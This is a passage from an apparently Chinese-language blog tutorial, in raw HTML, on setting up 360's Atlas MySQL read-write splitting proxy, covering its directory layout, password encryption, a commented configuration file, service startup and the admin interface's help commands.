23564 Dec 17  2014 mysql-proxy</span><br><span class="line">-rwxr-xr-x. 1 root root  1552 Dec 17  2014 mysql-proxyd</span><br><span class="line">-rw-r--r--. 1 root root     6 Dec 17  2014 VERSION</span><br><span class="line"></span><br><span class="line">/usr/local/mysql-proxy/conf:</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r--. 1 root root 2810 Dec 17  2014 test.cnf</span><br><span class="line"></span><br><span class="line">/usr/local/mysql-proxy/lib:</span><br><span class="line">total 9812</span><br><span class="line">-rwxr-xr-x. 1 root root  968655 Dec 17  2014 libevent-2.0.so.5</span><br><span class="line">-rwxr-xr-x. 1 root root 3464668 Dec 17  2014 libglib-2.0.so.0</span><br><span class="line">-rwxr-xr-x. 1 root root   35483 Dec 17  2014 libgmodule-2.0.so.0</span><br><span class="line">-rwxr-xr-x. 1 root root    8656 Dec 17  2014 libgthread-2.0.so.0</span><br><span class="line">-rwxr-xr-x. 1 root root 5021619 Dec 17  2014 libjemalloc.so.1</span><br><span class="line">-rwxr-xr-x. 1 root root  172984 Dec 17  2014 liblua-5.1.so</span><br><span class="line">-rwxr-xr-x. 1 root root   14735 Dec 17  2014 libmysql-chassis-glibext.so.0</span><br><span class="line">-rwxr-xr-x. 1 root root   73823 Dec 17  2014 libmysql-chassis.so.0</span><br><span class="line">-rwxr-xr-x. 1 root root   14446 Dec 17  2014 libmysql-chassis-timing.so.0</span><br><span class="line">-rwxr-xr-x. 1 root root  180107 Dec 17  2014 libmysql-proxy.so.0</span><br><span class="line">-rwxr-xr-x. 1 root root   71566 Dec 17  2014 libsql-tokenizer.so.0</span><br><span class="line">drwxr-xr-x. 4 root root      32 May  7 04:33 mysql-proxy</span><br><span class="line"></span><br><span class="line">/usr/local/mysql-proxy/lib/mysql-proxy:</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x. 3 root root 162 May  7 04:33 lua</span><br><span class="line">drwxr-xr-x. 2 root root  44 May  7 04:33 plugins</span><br><span class="line"></span><br><span class="line">/usr/local/mysql-proxy/lib/mysql-proxy/lua:</span><br><span class="line">total 240</span><br><span class="line">-rw-r--r--. 1 root root   9387 Dec 17  2014 admin.lua</span><br><span class="line">-rwxr-xr-x. 1 root root  15966 Dec 17  2014 chassis.so</span><br><span class="line">-rwxr-xr-x. 1 root root   8988 Dec 17  2014 crc32.so</span><br><span class="line">-rwxr-xr-x. 1 root root   9416 Dec 17  2014 glib2.so</span><br><span class="line">-rwxr-xr-x. 1 root root  18323 Dec 17  2014 lfs.so</span><br><span class="line">-rwxr-xr-x. 1 root root  43879 Dec 17  2014 lpeg.so</span><br><span class="line">-rwxr-xr-x. 1 root root 102944 Dec 17  2014 mysql.so</span><br><span class="line">-rwxr-xr-x. 1 root root   9248 Dec 17  2014 posix.so</span><br><span class="line">drwxr-xr-x. 2 root root    243 May  7 04:33 proxy</span><br><span class="line">-rwxr-xr-x. 1 root root   6626 Dec 17  2014 time.so</span><br><span class="line"></span><br><span class="line">/usr/local/mysql-proxy/lib/mysql-proxy/lua/proxy:</span><br><span class="line">total 80</span><br><span class="line">-rw-r--r--. 1 root root   536 Dec 17  2014 auth.lua</span><br><span class="line">-rw-r--r--. 1 root root  6670 Dec 17  2014 auto-config.lua</span><br><span class="line">-rw-r--r--. 1 root root  2807 Dec 17  2014 balance.lua</span><br><span class="line">-rw-r--r--. 1 root root  2873 Dec 17  2014 charset.lua</span><br><span class="line">-rw-r--r--. 1 root root  3477 Dec 17  2014 commands.lua</span><br><span class="line">-rw-r--r--. 1 root root   238 Dec 17  2014 crc32.lua</span><br><span class="line">-rw-r--r--. 1 root root  1906 Dec 17  2014 filter.lua</span><br><span class="line">-rw-r--r--. 1 root root  2706 Dec 17  2014 log.lua</span><br><span class="line">-rw-r--r--. 1 root root  6105 Dec 17  2014 parser.lua</span><br><span class="line">-rw-r--r--. 1 root root 14816 Dec 17  2014 split.lua</span><br><span class="line">-rw-r--r--. 1 root root  6366 Dec 17  2014 test.lua</span><br><span class="line">-rw-r--r--. 1 root root   106 Dec 17  2014 ticker.lua</span><br><span class="line">-rw-r--r--. 1 root root  6215 Dec 17  2014 tokenizer.lua</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#&#x65E5;&#x5FD7;&#x7EA7;&#x522B;&#xFF0C;&#x5206;&#x4E3A;message&#x3001;warning&#x3001;critical&#x3001;error&#x3001;debug&#x4E94;&#x4E2A;&#x7EA7;&#x522B;</span><br><span class="line">/usr/local/mysql-proxy/lib/mysql-proxy/plugins:</span><br><span class="line">total 4920</span><br><span class="line">-rwxr-xr-x. 1 root root   21134 Dec 17  2014 libadmin.so</span><br><span class="line">-rwxr-xr-x. 1 root root 5011799 Dec 17  2014 libproxy.so</span><br><span class="line"></span><br><span class="line">/usr/local/mysql-proxy/log:</span><br><span class="line">total 0</span><br></pre></td></tr></tbody></table></figure><p><strong>bin&#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7684;&#x90FD;&#x662F;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;</strong></p><ol><li>&#x201C;encrypt&#x201D;&#x662F;&#x7528;&#x6765;&#x5BF9;MySQL&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#x7684;&#xFF0C;&#x5728;&#x914D;&#x7F6E;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x7528;&#x5230;</li><li>&#x201C;mysql-proxy&#x201D;&#x662F;MySQL&#x81EA;&#x5DF1;&#x7684;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x4EE3;&#x7406;</li><li>&#x201C;mysql-proxyd&#x201D;&#x662F;360&#x5F04;&#x51FA;&#x6765;&#x7684;&#xFF0C;&#x540E;&#x9762;&#x6709;&#x4E2A;&#x201C;d&#x201D;&#xFF0C;&#x670D;&#x52A1;&#x7684;&#x542F;&#x52A8;&#x3001;&#x91CD;&#x542F;&#x3001;&#x505C;&#x6B62;&#xFF0C;&#x90FD;&#x662F;&#x7528;&#x4ED6;&#x6765;&#x6267;&#x884C;&#x7684;</li></ol><p><strong>conf&#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7684;&#x662F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</strong></p><ol><li>&#x201C;test.cnf&#x201D;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x7528;&#x6765;&#x914D;&#x7F6E;&#x4EE3;&#x7406;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;vim&#x6765;&#x7F16;&#x8F91;</li><li>lib&#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7684;&#x662F;&#x4E00;&#x4E9B;&#x5305;&#xFF0C;&#x4EE5;&#x53CA;Atlas&#x7684;&#x4F9D;&#x8D56;</li><li>log&#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7684;&#x662F;&#x65E5;&#x5FD7;&#xFF0C;&#x5982;&#x62A5;&#x9519;&#x7B49;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x7684;&#x8BB0;&#x5F55;</li></ol><p>&#x8FDB;&#x5165;bin&#x76EE;&#x5F55;&#xFF0C;&#x4F7F;&#x7528;encrypt&#x6765;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#xFF0C;&#x6211;&#x7684;MySQL&#x6570;&#x636E;&#x7684;&#x7528;&#x6237;&#x540D;&#x662F;root&#xFF0C;&#x5BC6;&#x7801;&#x662F;123456&#xFF0C;&#x6211;&#x9700;&#x8981;&#x5BF9;&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; cd /usr/local/mysql-proxy/</span><br><span class="line">[root@ctos7mini mysql-proxy]&amp; ./bin/encrypt 123456</span><br><span class="line">/iZxz+0GRoA=</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x914D;&#x7F6E;Atlas&#xFF0C;&#x4F7F;&#x7528;vim&#x8FDB;&#x884C;&#x7F16;&#x8F91;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; cat /usr/local/mysql-proxy/conf/test.cnf</span><br><span class="line">[mysql-proxy]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x5E26;#&#x53F7;&#x7684;&#x4E3A;&#x975E;&#x5FC5;&#x9700;&#x7684;&#x914D;&#x7F6E;&#x9879;&#x76EE;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x7BA1;&#x7406;&#x63A5;&#x53E3;&#x7684;&#x7528;&#x6237;&#x540D;</span><br><span class="line">admin-username = root</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x7BA1;&#x7406;&#x63A5;&#x53E3;&#x7684;&#x5BC6;&#x7801;</span><br><span class="line">admin-password = pwd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>Atlas&#x540E;&#x7AEF;&#x8FDE;&#x63A5;&#x7684;MySQL&#x4E3B;&#x5E93;&#x7684;IP&#x548C;&#x7AEF;&#x53E3;&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x591A;&#x9879;&#xFF0C;&#x7528;&#x9017;&#x53F7;&#x5206;&#x9694;</span><br><span class="line">proxy-backend-addresses = 192.168.73.21:3306</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>Atlas&#x540E;&#x7AEF;&#x8FDE;&#x63A5;&#x7684;MySQL&#x4ECE;&#x5E93;&#x7684;IP&#x548C;&#x7AEF;&#x53E3;&#xFF0C;@&#x540E;&#x9762;&#x7684;&#x6570;&#x5B57;&#x4EE3;&#x8868;&#x6743;&#x91CD;&#xFF0C;&#x7528;&#x6765;&#x4F5C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF0C;&#x82E5;&#x7701;&#x7565;&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;1&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x591A;&#x9879;&#xFF0C;&#x7528;&#x9017;&#x53F7;&#x5206;&#x9694;</span><br><span class="line">proxy-read-only-backend-addresses = 192.168.73.22:3306@1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x7528;&#x6237;&#x540D;&#x4E0E;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x52A0;&#x5BC6;&#x8FC7;&#x7684;MySQL&#x5BC6;&#x7801;&#xFF0C;&#x5BC6;&#x7801;&#x4F7F;&#x7528;PREFIX/bin&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x52A0;&#x5BC6;&#x7A0B;&#x5E8F;encrypt&#x52A0;&#x5BC6;&#xFF0C;&#x4E0B;&#x884C;&#x7684;user1&#x548C;user2&#x4E3A;&#x793A;&#x4F8B;&#xFF0C;&#x5C06;&#x5176;&#x66FF;&#x6362;&#x4E3A;&#x4F60;&#x7684;MySQL&#x7684;&#x7528;&#x6237;&#x540D;&#x548C;&#x52A0;&#x5BC6;&#x5BC6;&#x7801;&#xFF01;</span><br><span class="line">pwds = root:/iZxz+0GRoA=</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x8BBE;&#x7F6E;Atlas&#x7684;&#x8FD0;&#x884C;&#x65B9;&#x5F0F;&#xFF0C;&#x8BBE;&#x4E3A;true&#x65F6;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x65B9;&#x5F0F;&#xFF0C;&#x8BBE;&#x4E3A;false&#x65F6;&#x4E3A;&#x524D;&#x53F0;&#x65B9;&#x5F0F;&#xFF0C;&#x4E00;&#x822C;&#x5F00;&#x53D1;&#x8C03;&#x8BD5;&#x65F6;&#x8BBE;&#x4E3A;false&#xFF0C;&#x7EBF;&#x4E0A;&#x8FD0;&#x884C;&#x65F6;&#x8BBE;&#x4E3A;true,true&#x540E;&#x9762;&#x4E0D;&#x80FD;&#x6709;&#x7A7A;&#x683C;&#x3002;</span><br><span class="line">daemon = true</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x8BBE;&#x7F6E;Atlas&#x7684;&#x8FD0;&#x884C;&#x65B9;&#x5F0F;&#xFF0C;&#x8BBE;&#x4E3A;true&#x65F6;Atlas&#x4F1A;&#x542F;&#x52A8;&#x4E24;&#x4E2A;&#x8FDB;&#x7A0B;&#xFF0C;&#x4E00;&#x4E2A;&#x4E3A;monitor&#xFF0C;&#x4E00;&#x4E2A;&#x4E3A;worker&#xFF0C;monitor&#x5728;worker&#x610F;&#x5916;&#x9000;&#x51FA;&#x540E;&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x5176;&#x91CD;&#x542F;&#xFF0C;&#x8BBE;&#x4E3A;false&#x65F6;&#x53EA;&#x6709;worker&#xFF0C;&#x6CA1;&#x6709;monitor&#xFF0C;&#x4E00;&#x822C;&#x5F00;&#x53D1;&#x8C03;&#x8BD5;&#x65F6;&#x8BBE;&#x4E3A;false&#xFF0C;&#x7EBF;&#x4E0A;&#x8FD0;&#x884C;&#x65F6;&#x8BBE;&#x4E3A;true,true&#x540E;&#x9762;&#x4E0D;&#x80FD;&#x6709;&#x7A7A;&#x683C;&#x3002;</span><br><span class="line">keepalive = true</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x5BF9;Atlas&#x7684;&#x6027;&#x80FD;&#x6709;&#x5F88;&#x5927;&#x5F71;&#x54CD;&#xFF0C;&#x53EF;&#x6839;&#x636E;&#x60C5;&#x51B5;&#x9002;&#x5F53;&#x8BBE;&#x7F6E;</span><br><span class="line">event-threads = 8</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x65E5;&#x5FD7;&#x7EA7;&#x522B;&#xFF0C;&#x5206;&#x4E3A;message&#x3001;warning&#x3001;critical&#x3001;error&#x3001;debug&#x4E94;&#x4E2A;&#x7EA7;&#x522B;</span><br><span class="line">log-level = message</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x65E5;&#x5FD7;&#x5B58;&#x653E;&#x7684;&#x8DEF;&#x5F84;</span><br><span class="line">log-path = /usr/local/mysql-proxy/log</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>SQL&#x65E5;&#x5FD7;&#x7684;&#x5F00;&#x5173;&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x4E3A;OFF&#x3001;ON&#x3001;REALTIME&#xFF0C;OFF&#x4EE3;&#x8868;&#x4E0D;&#x8BB0;&#x5F55;SQL&#x65E5;&#x5FD7;&#xFF0C;ON&#x4EE3;&#x8868;&#x8BB0;&#x5F55;SQL&#x65E5;&#x5FD7;&#xFF0C;REALTIME &#x4EE3;&#x8868;&#x8BB0;&#x5F55;SQL&#x65E5;&#x5FD7;&#x4E14;&#x5B9E;&#x65F6;&#x5199;&#x5165;&#x78C1;&#x76D8;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;OFF</span><br><span class="line"><span class="meta">#</span>sql-log = OFF</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x6162;&#x65E5;&#x5FD7;&#x8F93;&#x51FA;&#x8BBE;&#x7F6E;&#x3002;&#x5F53;&#x8BBE;&#x7F6E;&#x4E86;&#x8BE5;&#x53C2;&#x6570;&#x65F6;&#xFF0C;&#x5219;&#x65E5;&#x5FD7;&#x53EA;&#x8F93;&#x51FA;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x8D85;&#x8FC7;sql-log-slow&#xFF08;&#x5355;&#x4F4D;&#xFF1A;ms)&#x7684;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55; &#x3002;&#x4E0D;&#x8BBE;&#x7F6E;&#x8BE5;&#x53C2;&#x6570;&#x5219;&#x8F93;&#x51FA;&#x5168;&#x90E8;&#x65E5;&#x5FD7;&#x3002;</span><br><span class="line"><span class="meta">#</span>sql-log-slow = 10</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x5B9E;&#x4F8B;&#x540D;&#x79F0;&#xFF0C;&#x7528;&#x4E8E;&#x540C;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x591A;&#x4E2A;Atlas&#x5B9E;&#x4F8B;&#x95F4;&#x7684;&#x533A;&#x5206;</span><br><span class="line"><span class="meta">#</span>instance = test</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>Atlas&#x76D1;&#x542C;&#x7684;&#x5DE5;&#x4F5C;&#x63A5;&#x53E3;IP&#x548C;&#x7AEF;&#x53E3;</span><br><span class="line">proxy-address = 0.0.0.0:1234</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>Atlas&#x76D1;&#x542C;&#x7684;&#x7BA1;&#x7406;&#x63A5;&#x53E3;IP&#x548C;&#x7AEF;&#x53E3;</span><br><span class="line">admin-address = 0.0.0.0:2345</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x5206;&#x8868;&#x8BBE;&#x7F6E;&#xFF0C;&#x6B64;&#x4F8B;&#x4E2D;person&#x4E3A;&#x5E93;&#x540D;&#xFF0C;mt&#x4E3A;&#x8868;&#x540D;&#xFF0C;id&#x4E3A;&#x5206;&#x8868;&#x5B57;&#x6BB5;&#xFF0C;3&#x4E3A;&#x5B50;&#x8868;&#x6570;&#x91CF;&#xFF0C;&#x53EF;&#x8BBE;&#x7F6E;&#x591A;&#x9879;&#xFF0C;&#x4EE5;&#x9017;&#x53F7;&#x5206;&#x9694;&#xFF0C; &#x82E5;&#x4E0D;&#x5206;&#x8868;&#x5219;&#x4E0D;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x8BE5;&#x9879;</span><br><span class="line"><span class="meta">#</span>tables = person.mt.id.3</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x9ED8;&#x8BA4;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x8BBE;&#x7F6E;&#x8BE5;&#x9879;&#x540E;&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x518D;&#x9700;&#x8981;&#x6267;&#x884C;SET NAMES&#x8BED;&#x53E5;</span><br><span class="line"><span class="meta">#</span>charset = utf8</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&#x5141;&#x8BB8;&#x8FDE;&#x63A5;Atlas&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x7684;IP&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x7CBE;&#x786E;IP&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;IP&#x6BB5;&#xFF0C;&#x4EE5;&#x9017;&#x53F7;&#x5206;&#x9694;&#xFF0C;&#x82E5;&#x4E0D;&#x8BBE;&#x7F6E;&#x8BE5;&#x9879;&#x5219;&#x5141;&#x8BB8;&#x6240;&#x6709;IP &#x8FDE;&#x63A5;&#xFF0C;&#x5426;&#x5219;&#x53EA;&#x5141;&#x8BB8;&#x5217;&#x8868;&#x4E2D;&#x7684;IP&#x8FDE;&#x63A5;</span><br><span class="line"><span class="meta">#</span>client-ips = 127.0.0.1, 192.168.1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>Atlas&#x524D;&#x9762;&#x6302;&#x63A5;&#x7684;LVS&#x7684;&#x7269;&#x7406;&#x7F51;&#x5361;&#x7684;IP(&#x6CE8;&#x610F;&#x4E0D;&#x662F;&#x865A;IP)&#xFF0C;&#x82E5;&#x6709;LVS&#x4E14;&#x8BBE;&#x7F6E;&#x4E86;client-ips&#x5219;&#x6B64;&#x9879;&#x5FC5;&#x987B;&#x8BBE;&#x7F6E;&#xFF0C;&#x5426; &#x5219;&#x53EF;&#x4EE5;&#x4E0D;&#x8BBE;&#x7F6E;</span><br><span class="line"><span class="meta">#</span>lvs-ips = 192.168.1.1</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x542F;&#x52A8;Atlas</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini bin]&amp; cd /usr/local/mysql-proxy/bin/</span><br><span class="line">[root@ctos7mini bin]&amp; ./mysql-proxyd test status</span><br><span class="line">MySQL-Proxy of test is NOT running</span><br><span class="line">[root@ctos7mini bin]&amp; ./mysql-proxyd test start</span><br><span class="line">OK: MySQL-Proxy of test is started</span><br><span class="line">[root@ctos7mini bin]&amp; ./mysql-proxyd test status</span><br><span class="line">MySQL-Proxy of test is running (13844)</span><br><span class="line">MySQL-Proxy of test is running (13846)</span><br><span class="line">[root@ctos7mini bin]&amp; systemctl stop mysqld</span><br></pre></td></tr></tbody></table></figure><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P2345 -uroot -ppwd</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 1</span><br><span class="line">Server version: 5.0.99-agent-admin</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">ERROR 1105 (07000): <span class="keyword">use</span> <span class="string">&apos;SELECT * FROM help&apos;</span> <span class="keyword">to</span> see the supported commands</span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">ERROR 1105 (07000): <span class="keyword">use</span> <span class="string">&apos;SELECT * FROM help&apos;</span> <span class="keyword">to</span> see the supported commands</span><br><span class="line">mysql&gt; <span class="keyword">help</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> information about MySQL products <span class="keyword">and</span> services, visit:</span><br><span class="line">   <span class="keyword">http</span>://www.mysql.com/</span><br><span class="line"><span class="keyword">For</span> developer information, <span class="keyword">including</span> the MySQL <span class="keyword">Reference</span> <span class="keyword">Manual</span>, visit:</span><br><span class="line">   <span class="keyword">http</span>://dev.mysql.com/</span><br><span class="line"><span class="keyword">To</span> buy MySQL <span class="keyword">Enterprise</span> support, training, <span class="keyword">or</span> other products, visit:</span><br><span class="line">   https://shop.mysql.com/</span><br><span class="line"></span><br><span class="line"><span class="keyword">List</span> <span class="keyword">of</span> all MySQL commands:</span><br><span class="line">Note that all <span class="built_in">text</span> commands must be <span class="keyword">first</span> <span class="keyword">on</span> line <span class="keyword">and</span> <span class="keyword">end</span> <span class="keyword">with</span> <span class="string">&apos;;&apos;</span></span><br><span class="line">?         (\?) <span class="keyword">Synonym</span> <span class="keyword">for</span> <span class="string">`help&apos;.</span></span><br><span class="line"><span class="string">clear     (\c) Clear the current input statement.</span></span><br><span class="line"><span class="string">connect   (\r) Reconnect to the server. Optional arguments are db and host.</span></span><br><span class="line"><span class="string">delimiter (\d) Set statement delimiter.</span></span><br><span class="line"><span class="string">edit      (\e) Edit command with $EDITOR.</span></span><br><span class="line"><span class="string">ego       (\G) Send command to mysql server, display result vertically.</span></span><br><span class="line"><span class="string">exit      (\q) Exit mysql. Same as quit.</span></span><br><span class="line"><span class="string">go        (\g) Send command to mysql server.</span></span><br><span class="line"><span class="string">help      (\h) Display this help.</span></span><br><span class="line"><span class="string">nopager   (\n) Disable pager, print to stdout.</span></span><br><span class="line"><span class="string">notee     (\t) Don&apos;t write into outfile.</span></span><br><span class="line"><span class="string">pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.</span></span><br><span class="line"><span class="string">print     (\p) Print current command.</span></span><br><span class="line"><span class="string">prompt    (\R) Change your mysql prompt.</span></span><br><span class="line"><span class="string">quit      (\q) Quit mysql.</span></span><br><span class="line"><span class="string">rehash    (\#) Rebuild completion hash.</span></span><br><span class="line"><span class="string">source    (\.) Execute an SQL script file. Takes a file name as an argument.</span></span><br><span class="line"><span class="string">status    (\s) Get status information from the server.</span></span><br><span class="line"><span class="string">system    (\!) Execute a system shell command.</span></span><br><span class="line"><span class="string">tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.</span></span><br><span class="line"><span class="string">use       (\u) Use another database. Takes database name as argument.</span></span><br><span class="line"><span class="string">charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.</span></span><br><span class="line"><span class="string">warnings  (\W) Show warnings after every statement.</span></span><br><span class="line"><span class="string">nowarning (\w) Don&apos;t show warnings after every statement.</span></span><br><span class="line"><span class="string">resetconnection(\x) Clean session context.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">For server side help, type &apos;help contents&apos;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql&gt; select * from help;</span></span><br><span class="line"><span class="string">+----------------------------+---------------------------------------------------------+</span></span><br><span class="line"><span class="string">| command                    | description                                             |</span></span><br><span class="line"><span class="string">+----------------------------+---------------------------------------------------------+</span></span><br><span class="line"><span class="string">| SELECT * FROM help         | shows this help                                         |</span></span><br><span class="line"><span class="string">| SELECT * FROM backends     | lists the backends and their state                      |</span></span><br><span class="line"><span class="string">| SET OFFLINE $backend_id    | offline backend server, $backend_id is backend_ndx&apos;s id |</span></span><br><span class="line"><span class="string">| SET ONLINE $backend_id     | online backend server, ...                              |</span></span><br><span class="line"><span class="string">| ADD MASTER $backend        | example: &quot;add master 127.0.0.1:3306&quot;, ...               |</span></span><br><span class="line"><span class="string">| ADD SLAVE $backend         | example: &quot;add slave 127.0.0.1:3306&quot;, ...                |</span></span><br><span class="line"><span class="string">| REMOVE BACKEND $backend_id | example: &quot;remove backend 1&quot;, ...                        |</span></span><br><span class="line"><span class="string">| SELECT * 